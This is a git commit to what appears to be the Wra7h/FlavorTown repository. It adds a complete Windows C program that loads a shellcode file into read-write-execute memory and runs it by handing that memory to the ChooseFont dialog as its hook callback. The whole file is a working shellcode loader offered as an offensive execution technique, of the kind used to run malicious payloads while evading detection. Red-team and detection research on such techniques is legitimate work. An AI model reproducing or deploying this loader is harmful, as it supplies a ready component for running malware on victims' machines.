ed6bd99a4aa347d262d887b91ef738ec8e710c82
Wra7h <60988551+Wra7h@users.noreply.github.com>
2022-09-14 22:58:55 -0700

    2 New Methods [Sept 14]

---
+++ C/ChooseFont.c
@@ -0,0 +1,62 @@
+// Wra7h/FlavorTown
+// Written/Compiled: Visual Studio 2022
+// Usage: this.exe <shellcode file>
+#pragma comment(lib, "Comdlg32.lib")
+
+#include <stdio.h>
+#include <windows.h>
+
+BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);
+
+INT wmain(INT argc, WCHAR* argv[])
+{
+	BOOL Ret = FALSE;
+	DWORD SCLen = 0;
+	PCHAR Shellcode = NULL;
+
+	if (argc != 2)
+	{
+		printf("Usage: ChooseFont.exe C:\\Path\\To\\Shellcode.bin");
+		goto CLEANUP;
+	}
+
+	//Read shellcode and setup
+	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
+	if (!Ret)
+		goto CLEANUP;
+
+	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
+		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+	memcpy(hAlloc, Shellcode, SCLen);
+
+	CHOOSEFONT sCF = { 0 };
+	sCF.lStructSize = sizeof(sCF);
+	sCF.Flags = CF_ENABLEHOOK;
+	sCF.lpfnHook = (LPCFHOOKPROC)hAlloc;
+
+	ChooseFont(&sCF);
+
+CLEANUP:
+	if (Shellcode)
+		free(Shellcode);
+
+	return 0;
+}
+
+BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
+{
+	FILE* f = NULL;
+	_wfopen_s(&f, Filepath, L"rb");
+	if (f)
+	{
+		fseek(f, 0, SEEK_END);
+		*BufferSize = ftell(f);
+		fseek(f, 0, SEEK_SET);
+		*Buffer = malloc(*BufferSize);
+		fread(*Buffer, *BufferSize, 1, f);
+		fclose(f);
+	}
+
+	return (*BufferSize != 0) ? TRUE : FALSE;
+}
